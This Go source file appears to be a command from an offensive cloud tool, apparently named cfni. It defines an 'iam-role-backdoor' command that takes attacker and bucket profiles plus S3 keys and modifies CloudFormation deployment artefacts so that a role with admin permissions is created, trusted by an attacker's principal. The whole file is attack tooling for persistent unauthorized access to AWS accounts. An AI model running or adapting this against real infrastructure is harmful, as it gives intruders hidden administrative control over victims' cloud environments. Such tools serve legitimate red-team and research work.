package cmd

import (
	"github.com/hupe1980/cfni/pkg/cfni"
	"github.com/spf13/cobra"
)

type iamRoleBackdoorOptions struct {
	attackOptions
	principal string
	logicalID string
	roleName  string
}

func newIAMRoleBackdoorCmd(globalOpts *globalOptions) *cobra.Command {
	opts := &iamRoleBackdoorOptions{}
	cmd := &cobra.Command{
		Use:           "iam-role-backdoor",
		Short:         "Adds a role with admin permissions",
		Example:       "cfni iam-role-backdoor --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX",
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			c, err := newCFNI(globalOpts)
			if err != nil {
				return err
			}

			s3AccessKey := &cfni.S3AccessKey{
				AccessKeyID:     opts.accessKeyID,
				SecretAccessKey: opts.secretAccessKey,
				SessionToken:    opts.sessionToken,
			}

			handler, err := c.CreateIAMRoleBackdoorHandler(&cfni.CreateIAMRoleBackdoorOptions{
				Principal:   opts.principal,
				LogicalID:   opts.logicalID,
				RoleName:    opts.roleName,
				S3AccessKey: s3AccessKey,
				Filter: &cfni.Filter{
					Environments: opts.environments,
					StackNames:   opts.stackNames,
				},
			})
			if err != nil {
				return err
			}

			return c.CreateInfrastructure(opts.bucket, handler, "", !s3AccessKey.IsValid())
		},
	}

	addAttackCommands(cmd, &opts.attackOptions)

	cmd.Flags().StringVarP(&opts.principal, "principal", "p", "", "principal for backdoor role (default root principal of the attacker account)")
	cmd.Flags().StringVarP(&opts.logicalID, "logical-id", "", "MaintenanceRoleBF21E41F", "logical id of the backdoor role")
	cmd.Flags().StringVarP(&opts.roleName, "role-name", "r", "", "name of the backdoor role (default generated role-name)")

	return cmd
}
